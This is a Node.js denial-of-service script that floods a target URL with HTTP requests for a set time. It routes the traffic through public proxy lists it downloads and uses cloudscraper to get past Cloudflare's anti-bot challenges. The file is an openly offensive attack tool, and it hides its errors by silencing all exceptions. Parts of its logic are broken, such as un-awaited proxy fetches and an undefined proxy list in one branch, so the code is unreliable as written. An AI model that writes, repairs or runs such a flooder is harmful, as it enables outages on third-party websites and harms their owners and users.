require('events').EventEmitter.defaultMaxListeners = 0;
const fs = require('fs'),
    CloudScraper = require('cloudscraper'),
    axios = require('axios'),
    path = require('path');

if (process.argv.length !== 6) {
    console.log(`
Usage: node ${path.basename(__filename)} <url> <time> <req_per_ip> <proxies>
Usage: node ${path.basename(__filename)} <http://example.com> <60> <100> <http.txt>`);
    process.exit(0);
}

const target = process.argv[2],
    time = process.argv[3],
    req_per_ip = process.argv[4];

if (process.argv[5] == "proxy") {
	console.log('ATTACK HTTP_PROXY');
	const proxyscrape_http = axios.get('https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all');
	const proxy_list_http = axios.get('https://www.proxy-list.download/api/v1/get?type=http');
	const raw_github_http = axios.get('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt');
	var proxies = proxyscrape_http.data.replace(/\r/g, '').split('\n');
	var proxies = proxy_list_http.data.replace(/\r/g, '').split('\n');
	var proxies = raw_github_http.data.replace(/\r/g, '').split('\n');
} else {
	console.log('ATTACK HTTP_PROXY');
}

function send_req() {
    let proxy = proxies[Math.floor(Math.random() * proxies.length)];

    let getHeaders = new Promise(function (resolve, reject) {
        CloudScraper({
            uri: target,
            resolveWithFullResponse: true,
            proxy: 'http://' + proxy,
            challengesToSolve: 10
        }, function (error, response) {
            if (error) {
                let obj_v = proxies.indexOf(proxy);
                proxies.splice(obj_v, 1);
                return console.log(error.message);
            }
            resolve(response.request.headers);
        });
    });

    getHeaders.then(function (result) {
        // Object.keys(result).forEach(function (i, e) {
        //     console.log(i + ': ' + result[i]);
        // });
        for (let i = 0; i < req_per_ip; ++i) {
            CloudScraper({
                uri: target,
                headers: result,
                proxy: 'http://' + proxy,
                followAllRedirects: false
            }, function (error, response) {
                if (error) {
                    console.log(error.message);
                }
            });
        }
    });
}

setInterval(() => {
    send_req();
});

setTimeout(() => {
    console.log('Attack ended.');
    process.exit(0)
}, time * 1000);

// to avoid errors
process.on('uncaughtException', function (err) {
    // console.log(err);
});
process.on('unhandledRejection', function (err) {
    // console.log(err);
});
